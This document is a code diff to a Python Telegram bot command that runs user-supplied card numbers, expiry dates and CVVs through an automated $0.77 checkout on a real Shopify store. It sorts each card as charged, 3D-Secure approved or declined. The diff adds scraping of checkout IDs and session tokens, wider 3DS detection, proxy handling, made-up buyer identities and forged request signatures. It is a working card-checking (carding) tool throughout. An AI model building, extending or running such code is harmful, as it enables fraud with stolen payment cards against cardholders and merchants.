@@ -173,7 +173,7 @@ class ShopifyLogger:
             "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
             "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
             "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
-            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
+            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳", "3DS": "🔐"
         }
         error_icon = error_icons.get(error_type, "⚠️")
         log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
@@ -335,7 +335,7 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             response_display = "NO_PROXY_AVAILABLE"
         elif "CAPTCHA" in raw_response.upper():
             response_display = "CAPTCHA"
-        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
+        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper() or "AUTHENTICATION" in raw_response.upper() or "VERIFICATION" in raw_response.upper():
             response_display = "3D_SECURE"
         elif "INSUFFICIENT" in raw_response.upper():
             response_display = "INSUFFICIENT_FUNDS"
@@ -375,6 +375,17 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
         ]):
             status_flag = "Charged ✅"
+        # Check for 3D Secure / Authentication required
+        elif any(keyword in raw_response_upper for keyword in [
+            "3D", "3DS", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
+            "3DS_REQUIRED", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
+            "ACTIONREQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
+            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
+            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE",
+            "CHALLENGE_REQUIRED", "REDIRECT_REQUIRED"
+        ]):
+            status_flag = "Approved ❎"
+            response_display = "3D_SECURE"
         # Check for CAPTCHA
         elif any(keyword in raw_response_upper for keyword in [
             "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
@@ -407,15 +418,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
         ]):
             status_flag = "Declined ❌"
-        # Check for 3D Secure
-        elif any(keyword in raw_response_upper for keyword in [
-            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
-            "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
-            "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
-            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
-            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
-        ]):
-            status_flag = "Approved ❎"
         # Check for CVV errors
         elif any(keyword in raw_response_upper for keyword in [
             "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
@@ -678,9 +680,10 @@ class ShopifyMiddleEasternCheckout:
         self.base_url = "https://shopmiddleeastern.com"
         self.product_handle = "el-mordjene-vanille-10-g"
         self.variant_id = "39312450584663"  # Product variant ID from captured data
+        self.product_id = "6564222206039"   # Product ID from captured data
         
         # Direct checkout URL that bypasses cart and goes straight to checkout
-        self.direct_checkout_url = f"{self.base_url}/cart/{self.variant_id}:1"
+        self.direct_checkout_url = f"{self.base_url}/cart/{self.variant_id}:1?checkout=1"
         
         # Proxy management
         self.proxy_url = None
@@ -713,44 +716,22 @@ class ShopifyMiddleEasternCheckout:
         self.session_token = None
         self.graphql_session_token = None
         self.receipt_id = None
-        self.product_id = "6564222206039"    # Product ID from captured data
         self.stable_id = None
         self.queue_token = None
         self.shop_id = "7899283507"  # Shop ID from captured data
 
-        # Store extracted schema info from captured traffic
-        self.proposal_id = "95a8a140eea7d6e6554cfb57ab3b14e20b2bbdd72a1a8bc180e4a28918f3be8c"
-        self.submit_id = "d50b365913d0a33a1d8905bfe5d0ecded1a633cb6636cbed743999cfacefa8cb"
-        self.poll_id = "baa45c97a49dae99440b5f8a954dfb31b01b7af373f5335204c29849f3397502"
+        # Dynamic IDs - will be extracted from checkout page
+        self.proposal_id = None
+        self.submit_id = None
+        self.poll_id = None
         
-        # Delivery strategy handle for pickup from captured data (Middle Eastern Market)
-        self.delivery_strategy_handle = "1645b37f401acc9f89a7314931320b56-d1034e3625f52df7167f7147c44cdf16"
+        # Dynamic delivery strategy handle - will be extracted
+        self.delivery_strategy_handle = None
         
-        # Payment method identifier for Shopify Payments from captured data
-        self.payment_method_identifier = "52f25659ce34a87c642a51c00887c2e2"
-
-        self.logger = ShopifyLogger(user_id)
-
-        # Random data generators
-        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
-                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
-                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
-                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
-                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark", "Randua",
-                           "Ahley", "Ashley", "Jessica", "Sarah", "Emily", "Lisa", "Michelle", "Mallika"]
-        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
-                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
-                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
-                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
-                          "Trump", "Walker", "Hall", "Allen", "Young", "King", "Baby"]
-
-        self.first_name = random.choice(self.first_names)
-        self.last_name = random.choice(self.last_names)
-        self.full_name = f"{self.first_name} {self.last_name}"
-        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@hotmail.com"
-        self.phone = f"515{random.randint(100, 999)}{random.randint(1000, 9999)}"
-
-        # Fixed address based on captured data (Middle Eastern Market pickup location)
+        # Payment method identifier - will be extracted
+        self.payment_method_identifier = None
+        
+        # Address from captured data (Middle Eastern Market pickup location)
         self.address = {
             "address1": "3950 North Harlem Avenue",
             "address2": "",
@@ -765,6 +746,27 @@ class ShopifyMiddleEasternCheckout:
             "latitude": 41.9522135,
             "longitude": -87.8076595
         }
+
+        self.logger = ShopifyLogger(user_id)
+
+        # Random data generators
+        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
+                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
+                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
+                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
+                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark", "Randua",
+                           "Ashley", "Jessica", "Sarah", "Emily", "Lisa", "Michelle", "Mallika"]
+        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
+                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
+                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
+                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
+                          "Trump", "Walker", "Hall", "Allen", "Young", "King", "Baby"]
+
+        self.first_name = random.choice(self.first_names)
+        self.last_name = random.choice(self.last_names)
+        self.full_name = f"{self.first_name} {self.last_name}"
+        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@hotmail.com"
+        self.phone = f"773{random.randint(100, 999)}{random.randint(1000, 9999)}"
 
     async def random_delay(self, min_sec=0.3, max_sec=0.7):
         """Minimal delay between requests"""
@@ -819,6 +821,100 @@ class ShopifyMiddleEasternCheckout:
         timestamp = self.generate_timestamp()
         return f"{self.checkout_token}-{timestamp}"
 
+    async def extract_dynamic_ids_from_checkout_page(self, html_content):
+        """Extract Proposal ID, Submit ID, Poll ID, delivery strategy handle, and payment method identifier from checkout page"""
+        
+        # Extract Proposal ID - look for "Proposal" operation ID
+        proposal_pattern = r'"operationName":"Proposal","id":"([a-f0-9]+)"'
+        proposal_match = re.search(proposal_pattern, html_content)
+        if proposal_match:
+            self.proposal_id = proposal_match.group(1)
+            self.logger.data_extracted("Proposal ID", self.proposal_id, "Checkout page HTML")
+        
+        # Alternative pattern for Proposal ID
+        if not self.proposal_id:
+            proposal_pattern2 = r'"id":"([a-f0-9]{64})"[^}]*"operationName":"Proposal"'
+            proposal_match2 = re.search(proposal_pattern2, html_content)
+            if proposal_match2:
+                self.proposal_id = proposal_match2.group(1)
+                self.logger.data_extracted("Proposal ID", self.proposal_id, "Checkout page HTML (alt)")
+        
+        # Extract SubmitForCompletion ID
+        submit_pattern = r'"operationName":"SubmitForCompletion","id":"([a-f0-9]+)"'
+        submit_match = re.search(submit_pattern, html_content)
+        if submit_match:
+            self.submit_id = submit_match.group(1)
+            self.logger.data_extracted("SubmitForCompletion ID", self.submit_id, "Checkout page HTML")
+        
+        # Alternative pattern for SubmitForCompletion ID
+        if not self.submit_id:
+            submit_pattern2 = r'"id":"([a-f0-9]{64})"[^}]*"operationName":"SubmitForCompletion"'
+            submit_match2 = re.search(submit_pattern2, html_content)
+            if submit_match2:
+                self.submit_id = submit_match2.group(1)
+                self.logger.data_extracted("SubmitForCompletion ID", self.submit_id, "Checkout page HTML (alt)")
+        
+        # Extract PollForReceipt ID
+        poll_pattern = r'"operationName":"PollForReceipt","id":"([a-f0-9]+)"'
+        poll_match = re.search(poll_pattern, html_content)
+        if poll_match:
+            self.poll_id = poll_match.group(1)
+            self.logger.data_extracted("PollForReceipt ID", self.poll_id, "Checkout page HTML")
+        
+        # Alternative pattern for PollForReceipt ID
+        if not self.poll_id:
+            poll_pattern2 = r'"id":"([a-f0-9]{64})"[^}]*"operationName":"PollForReceipt"'
+            poll_match2 = re.search(poll_pattern2, html_content)
+            if poll_match2:
+                self.poll_id = poll_match2.group(1)
+                self.logger.data_extracted("PollForReceipt ID", self.poll_id, "Checkout page HTML (alt)")
+        
+        # Extract delivery strategy handle for pickup
+        delivery_pattern = r'"deliveryStrategyByHandle":\{"handle":"([a-f0-9]+-[a-f0-9]+)"'
+        delivery_match = re.search(delivery_pattern, html_content)
+        if delivery_match:
+            self.delivery_strategy_handle = delivery_match.group(1)
+            self.logger.data_extracted("Delivery Strategy Handle", self.delivery_strategy_handle, "Checkout page HTML")
+        
+        # Alternative pattern for delivery strategy
+        if not self.delivery_strategy_handle:
+            delivery_pattern2 = r'PICK_UP.*?handle":"([^"]+)"'
+            delivery_match2 = re.search(delivery_pattern2, html_content)
+            if delivery_match2:
+                self.delivery_strategy_handle = delivery_match2.group(1)
+                self.logger.data_extracted("Delivery Strategy Handle", self.delivery_strategy_handle, "Checkout page HTML (alt)")
+        
+        # Extract payment method identifier for Shopify Payments
+        payment_pattern = r'"paymentMethodIdentifier":"([a-f0-9]{32})"'
+        payment_match = re.search(payment_pattern, html_content)
+        if payment_match:
+            self.payment_method_identifier = payment_match.group(1)
+            self.logger.data_extracted("Payment Method Identifier", self.payment_method_identifier, "Checkout page HTML")
+        
+        # If not found, use default from captured traffic
+        if not self.payment_method_identifier:
+            self.payment_method_identifier = "52f25659ce34a87c642a51c00887c2e2"
+            self.logger.data_extracted("Payment Method Identifier (Default)", self.payment_method_identifier, "Fallback")
+        
+        # Fallback IDs if extraction failed (from captured traffic)
+        if not self.proposal_id:
+            self.proposal_id = "e65ffeb18d0b5e7cc746231c07befb63f4bc2e69c060d4067ca9115a923ae427"
+            self.logger.data_extracted("Proposal ID (Fallback)", self.proposal_id, "Hardcoded")
+        
+        if not self.submit_id:
+            self.submit_id = "7cc51969cc21c5f45bc518e0650abe94c2ff3ffa378fb7d0b72212b44ff36470"
+            self.logger.data_extracted("SubmitForCompletion ID (Fallback)", self.submit_id, "Hardcoded")
+        
+        if not self.poll_id:
+            self.poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
+            self.logger.data_extracted("PollForReceipt ID (Fallback)", self.poll_id, "Hardcoded")
+        
+        if not self.delivery_strategy_handle:
+            self.delivery_strategy_handle = "ac9e7f3aa427ceb472f68152b58f9b9d-d1034e3625f52df7167f7147c44cdf16"
+            self.logger.data_extracted("Delivery Strategy Handle (Fallback)", self.delivery_strategy_handle, "Hardcoded")
+        
+        return True
+
     async def direct_to_checkout(self):
         """Step 1: Direct checkout link to get checkout token (bypasses cart)"""
         self.step(1, "DIRECT CHECKOUT", f"Using direct checkout link to bypass cart")
@@ -872,7 +968,7 @@ class ShopifyMiddleEasternCheckout:
             return False, f"Direct checkout error: {str(e)[:50]}"
 
     async def get_checkout_page(self):
-        """Step 2: Get the checkout page to extract session token"""
+        """Step 2: Get the checkout page to extract session token and dynamic IDs"""
         self.step(2, "GET CHECKOUT PAGE", "Loading checkout page")
         
         checkout_headers = {
@@ -894,10 +990,26 @@ class ShopifyMiddleEasternCheckout:
             if resp.status_code != 200:
                 return False, f"Checkout page failed: {resp.status_code}"
             
-            # Extract session token from response or generate based on pattern
-            # In captured traffic, this is a long token starting with AAEB_
-            self.session_token = f"AAEB_{self.generate_random_string(50)}"
-            self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "Checkout page")
+            # Extract session token from response - format starts with AAEB_
+            # Look for x-checkout-one-session-token or extract from page
+            session_token_pattern = r'x-checkout-one-session-token["\']?\s*:\s*["\']([A-Za-z0-9_]+)'
+            session_match = re.search(session_token_pattern, str(resp.headers))
+            if session_match:
+                self.session_token = session_match.group(1)
+            else:
+                # Try to extract from response body
+                body_token_pattern = r'"sessionToken":"([A-Za-z0-9_]+)"'
+                body_match = re.search(body_token_pattern, resp.text)
+                if body_match:
+                    self.session_token = body_match.group(1)
+                else:
+                    # Generate fallback session token
+                    self.session_token = f"AAEB_{self.generate_random_string(50)}"
+            
+            self.logger.data_extracted("Session Token", self.session_token[:30] + "...", "Checkout page")
+            
+            # Extract dynamic IDs from the checkout page
+            await self.extract_dynamic_ids_from_checkout_page(resp.text)
             
             return True, resp.text
             
@@ -943,12 +1055,15 @@ class ShopifyMiddleEasternCheckout:
         # Generate stable ID for merchandise line
         self.stable_id = self.generate_uuid()
         
+        # Generate queue token
+        queue_token = f"A{self.generate_random_string(43)}=="
+        
         # Variables based on captured Proposal request
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
             },
-            "queueToken": f"A{self.generate_random_string(43)}==",
+            "queueToken": queue_token,
             "discounts": {
                 "lines": [],
                 "acceptUnexpectedDiscounts": True
@@ -958,22 +1073,26 @@ class ShopifyMiddleEasternCheckout:
                     "destination": {
                         "geolocation": {
                             "coordinates": {
-                                "latitude": 28.6542,
-                                "longitude": 77.2373
+                                "latitude": 28.6327,
+                                "longitude": 77.2198
                             },
                             "countryCode": "US"
                         }
                     },
                     "selectedDeliveryStrategy": {
-                        "deliveryStrategyMatchingConditions": {
-                            "estimatedTimeInTransit": {"any": True},
-                            "shipments": {"any": True}
+                        "deliveryStrategyByHandle": {
+                            "handle": self.delivery_strategy_handle,
+                            "customDeliveryRate": False
                         },
                         "options": {}
                     },
-                    "targetMerchandiseLines": {"any": True},
+                    "targetMerchandiseLines": {
+                        "lines": [{"stableId": self.stable_id}]
+                    },
                     "deliveryMethodTypes": ["PICK_UP"],
-                    "expectedTotalPrice": {"any": True},
+                    "expectedTotalPrice": {
+                        "value": {"amount": "0.00", "currencyCode": "USD"}
+                    },
                     "destinationChanged": True
                 }],
                 "noDeliveryRequired": [],
@@ -1033,14 +1152,14 @@ class ShopifyMiddleEasternCheckout:
                 "email": self.email,
                 "emailChanged": True,
                 "phoneCountryCode": "US",
-                "marketingConsent": [],
+                "marketingConsent": [{"email": {"consentState": "DECLINED", "value": self.email}}],
                 "shopPayOptInPhone": {"countryCode": "US"},
                 "rememberMe": False
             },
             "tip": {"tipLines": []},
             "taxes": {
                 "proposedAllocations": None,
-                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
+                "proposedTotalAmount": {"value": {"amount": "0.02", "currencyCode": "USD"}},
                 "proposedTotalIncludedAmount": None,
                 "proposedMixedStateTotalAmount": None,
                 "proposedExemptions": []
@@ -1056,7 +1175,8 @@ class ShopifyMiddleEasternCheckout:
                 "shippingScriptChanges": []
             },
             "optionalDuties": {"buyerRefusesDuties": False},
-            "cartMetafields": []
+            "cartMetafields": [],
+            "includeTaxStrategyLines": False
         }
         
         payload = {
@@ -1082,15 +1202,20 @@ class ShopifyMiddleEasternCheckout:
                 # Check for errors in response
                 if 'errors' in proposal_resp and proposal_resp['errors']:
                     error_msgs = []
+                    has_validation_errors = False
+                    
                     for error in proposal_resp['errors']:
                         error_code = error.get('code', 'UNKNOWN')
                         error_msgs.append(error_code)
+                        
+                        # Check for expected validation errors (billing address not set yet)
+                        if error_code in ['PAYMENTS_FIRST_NAME_REQUIRED', 'PAYMENTS_LAST_NAME_REQUIRED',
+                                          'PAYMENTS_ADDRESS1_REQUIRED', 'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY',
+                                          'PAYMENTS_POSTAL_CODE_REQUIRED', 'PAYMENTS_CITY_REQUIRED']:
+                            has_validation_errors = True
                     
-                    # Check for specific error codes that are expected (like tax change)
-                    if any(code in ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'PAYMENTS_FIRST_NAME_REQUIRED', 
-                                    'PAYMENTS_LAST_NAME_REQUIRED', 'PAYMENTS_ADDRESS1_REQUIRED', 
-                                    'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY', 'PAYMENTS_POSTAL_CODE_REQUIRED', 
-                                    'PAYMENTS_CITY_REQUIRED', 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT'] for code in error_msgs):
+                    # These are expected validation errors - not actual declines
+                    if has_validation_errors:
                         self.logger.data_extracted("Proposal", f"Expected validation errors: {', '.join(error_msgs)}", "Expected")
                         
                         # Extract queue token from response data if available
@@ -1102,6 +1227,22 @@ class ShopifyMiddleEasternCheckout:
                         
                         return True, "VALIDATION_ERRORS"
                     
+                    # Check for 3D Secure / Authentication required
+                    auth_codes = ['PAYMENTS_AUTHENTICATION_REQUIRED', 'PAYMENTS_3DS_REQUIRED', 
+                                  'PAYMENTS_CHALLENGE_REQUIRED', 'PAYMENTS_ACTION_REQUIRED']
+                    if any(code in error_msgs for code in auth_codes):
+                        self.logger.error_log("3DS", "3D Secure authentication required", "Proposal")
+                        return False, "DECLINED - 3D_SECURE"
+                    
+                    # Check for insufficient funds
+                    if 'PAYMENTS_INSUFFICIENT_FUNDS' in error_msgs:
+                        return False, "DECLINED - INSUFFICIENT_FUNDS"
+                    
+                    # Check for invalid card
+                    if 'PAYMENTS_INVALID_CARD' in error_msgs:
+                        return False, "DECLINED - INVALID_CARD"
+                    
+                    # Other errors
                     return False, f"DECLINED - {', '.join(error_msgs)}"
                 
                 # Extract queue token from response
@@ -1240,7 +1381,7 @@ class ShopifyMiddleEasternCheckout:
                 "email": self.email,
                 "emailChanged": False,
                 "phoneCountryCode": "US",
-                "marketingConsent": [],
+                "marketingConsent": [{"email": {"consentState": "DECLINED", "value": self.email}}],
                 "shopPayOptInPhone": {"countryCode": "US"},
                 "rememberMe": False
             },
@@ -1263,7 +1404,8 @@ class ShopifyMiddleEasternCheckout:
                 "shippingScriptChanges": []
             },
             "optionalDuties": {"buyerRefusesDuties": False},
-            "cartMetafields": []
+            "cartMetafields": [],
+            "includeTaxStrategyLines": False
         }
         
         payload = {
@@ -1285,6 +1427,13 @@ class ShopifyMiddleEasternCheckout:
             
             try:
                 pickup_resp = resp.json()
+                
+                # Check for errors
+                if 'errors' in pickup_resp and pickup_resp['errors']:
+                    for error in pickup_resp['errors']:
+                        error_code = error.get('code', '')
+                        if '3DS' in error_code or 'AUTHENTICATION' in error_code:
+                            return False, "DECLINED - 3D_SECURE"
                 
                 # Extract new queue token
                 data = pickup_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
@@ -1328,7 +1477,7 @@ class ShopifyMiddleEasternCheckout:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
         }
         
-        # Generate shopify-identification-signature (similar to captured)
+        # Generate shopify-identification-signature
         header = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
         payload_data = {
             "client_id": "2",
@@ -1424,7 +1573,7 @@ class ShopifyMiddleEasternCheckout:
             'x-checkout-one-session-token': self.session_token
         }
         
-        # Variables for billing address update based on captured request
+        # Variables for billing address update
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
@@ -1506,7 +1655,7 @@ class ShopifyMiddleEasternCheckout:
                                     "firstName": self.first_name,
                                     "lastName": self.last_name,
                                     "zoneCode": self.address["provinceCode"],
-                                    "phone": ""
+                                    "phone": self.phone
                                 }
                             },
                             "cardSource": None
@@ -1544,9 +1693,10 @@ class ShopifyMiddleEasternCheckout:
                         "firstName": self.first_name,
                         "lastName": self.last_name,
                         "zoneCode": self.address["provinceCode"],
-                        "phone": ""
+                        "phone": self.phone
                     }
-                }
+                },
+                "creditCardBin": cc[:8] if hasattr(self, 'cc') else ""
             },
             "buyerIdentity": {
                 "customer": {
@@ -1556,7 +1706,7 @@ class ShopifyMiddleEasternCheckout:
                 "email": self.email,
                 "emailChanged": False,
                 "phoneCountryCode": "US",
-                "marketingConsent": [],
+                "marketingConsent": [{"email": {"consentState": "DECLINED", "value": self.email}}],
                 "shopPayOptInPhone": {"countryCode": "US"},
                 "rememberMe": False
             },
@@ -1579,7 +1729,8 @@ class ShopifyMiddleEasternCheckout:
                 "shippingScriptChanges": []
             },
             "optionalDuties": {"buyerRefusesDuties": False},
-            "cartMetafields": []
+            "cartMetafields": [],
+            "includeTaxStrategyLines": False
         }
         
         payload = {
@@ -1602,6 +1753,13 @@ class ShopifyMiddleEasternCheckout:
             try:
                 billing_resp = resp.json()
                 
+                # Check for errors
+                if 'errors' in billing_resp and billing_resp['errors']:
+                    for error in billing_resp['errors']:
+                        error_code = error.get('code', '')
+                        if '3DS' in error_code or 'AUTHENTICATION' in error_code:
+                            return False, "DECLINED - 3D_SECURE"
+                
                 # Extract new queue token
                 data = billing_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                 new_queue_token = data.get('queueToken')
@@ -1623,7 +1781,7 @@ class ShopifyMiddleEasternCheckout:
             self.logger.error_log("BILLING_UPDATE", str(e))
             return False, f"Billing update error: {str(e)[:50]}"
 
-    async def submit_for_completion(self, payment_session_id):
+    async def submit_for_completion(self, payment_session_id, cc):
         """Step 7: Submit for completion - final payment"""
         self.step(7, "SUBMIT PAYMENT", "Finalizing payment of 0.77$")
         
@@ -1648,10 +1806,10 @@ class ShopifyMiddleEasternCheckout:
             'x-checkout-one-session-token': self.session_token
         }
         
-        # Generate attempt token (checkout-token-random)
+        # Generate attempt token
         attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
         
-        # Variables based on captured SubmitForCompletion request
+        # Variables for SubmitForCompletion
         variables = {
             "input": {
                 "sessionInput": {
@@ -1734,7 +1892,7 @@ class ShopifyMiddleEasternCheckout:
                                         "firstName": self.first_name,
                                         "lastName": self.last_name,
                                         "zoneCode": self.address["provinceCode"],
-                                        "phone": ""
+                                        "phone": self.phone
                                     }
                                 },
                                 "cardSource": None
@@ -1772,9 +1930,10 @@ class ShopifyMiddleEasternCheckout:
                             "firstName": self.first_name,
                             "lastName": self.last_name,
                             "zoneCode": self.address["provinceCode"],
-                            "phone": ""
+                            "phone": self.phone
                         }
-                    }
+                    },
+                    "creditCardBin": cc[:8] if cc else ""
                 },
                 "buyerIdentity": {
                     "customer": {
@@ -1784,7 +1943,7 @@ class ShopifyMiddleEasternCheckout:
                     "email": self.email,
                     "emailChanged": False,
                     "phoneCountryCode": "US",
-                    "marketingConsent": [],
+                    "marketingConsent": [{"email": {"consentState": "DECLINED", "value": self.email}}],
                     "shopPayOptInPhone": {"countryCode": "US"},
                     "rememberMe": False
                 },
@@ -1814,7 +1973,8 @@ class ShopifyMiddleEasternCheckout:
             "analytics": {
                 "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us",
                 "pageId": self.generate_uuid().upper()
-            }
+            },
+            "includeTaxStrategyLines": False
         }
         
         payload = {
@@ -1843,6 +2003,12 @@ class ShopifyMiddleEasternCheckout:
                     for error in submit_resp['errors']:
                         error_code = error.get('code', 'UNKNOWN')
                         error_msgs.append(error_code)
+                        
+                        # Check for 3D Secure
+                        if error_code in ['PAYMENTS_AUTHENTICATION_REQUIRED', 'PAYMENTS_3DS_REQUIRED',
+                                          'PAYMENTS_CHALLENGE_REQUIRED', 'PAYMENTS_ACTION_REQUIRED']:
+                            return False, "DECLINED - 3D_SECURE"
+                    
                     return False, f"DECLINED - {', '.join(error_msgs)}"
                 
                 data = submit_resp.get('data', {}).get('submitForCompletion', {})
@@ -1869,6 +2035,11 @@ class ShopifyMiddleEasternCheckout:
                 elif receipt_type == 'FailedReceipt':
                     error_info = receipt.get('processingError', {})
                     error_code = error_info.get('code', 'GENERIC_ERROR')
+                    
+                    # Check for 3D Secure in failed receipt
+                    if '3DS' in error_code or 'AUTHENTICATION' in error_code:
+                        return False, f"DECLINED - 3D_SECURE"
+                    
                     return False, f"DECLINED - {error_code}"
                     
                 else:
@@ -1951,6 +2122,11 @@ class ShopifyMiddleEasternCheckout:
                     if receipt_type == 'FailedReceipt':
                         error_info = receipt_data.get('processingError', {})
                         error_code = error_info.get('code', 'GENERIC_ERROR')
+                        
+                        # Check for 3D Secure
+                        if '3DS' in error_code or 'AUTHENTICATION' in error_code:
+                            return False, "DECLINED - 3D_SECURE"
+                        
                         return False, f"DECLINED - {error_code}"
                         
                     elif receipt_type == 'ProcessedReceipt':
@@ -2024,7 +2200,7 @@ class ShopifyMiddleEasternCheckout:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 2: Get checkout page
+            # Step 2: Get checkout page and extract dynamic IDs
             success, result = await self.get_checkout_page()
             if not success:
                 return False, result
@@ -2055,7 +2231,7 @@ class ShopifyMiddleEasternCheckout:
             await self.random_delay(0.3, 0.5)
             
             # Step 7: Submit for completion
-            success, result = await self.submit_for_completion(payment_session_id)
+            success, result = await self.submit_for_completion(payment_session_id, cc)
             
             return success, result
             
@@ -2198,9 +2374,9 @@ async def handle_shopify_middle_eastern(client: Client, message: Message):
 <b>~ Note:</b> <code>Shopify Charge 0.77$</code>""")
             return
 
-        card_details = ' '.join(args[1:])  # Join all remaining arguments to handle multi-word inputs
+        card_details = ' '.join(args[1:])
 
-        # Validate that we can parse the card using universal Unicode stripper
+        # Validate that we can parse the card
         cc, mes, ano, cvv = parse_card_input(card_details)
         if not cc or not mes or not ano or not cvv:
             await message.reply("""<pre>❌ Invalid Format</pre>
